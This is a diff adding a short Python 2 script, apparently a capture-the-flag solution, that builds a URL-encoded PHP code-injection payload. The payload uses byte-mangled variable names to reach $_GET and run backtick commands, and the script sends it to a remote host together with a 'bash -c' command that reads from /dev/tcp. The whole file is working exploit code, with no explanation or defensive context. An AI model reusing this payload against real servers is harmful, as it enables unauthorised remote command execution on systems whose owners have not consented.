@@ -1,0 +1,9 @@
+''PHP => caner language'''
+from requests import *
+import urllib
+
+d=r'$i=${%7FGET%26%DFGET}{0};die(`$i`);'
+print urllib.unquote(d)
+print len(urllib.unquote(d))
+r = get('http://l4w.pw//%F0%9F%A4%94/?%E2%81%A3='+d+'&0=bash -c "cat</dev/tcp/0/8888"')
+print r.text
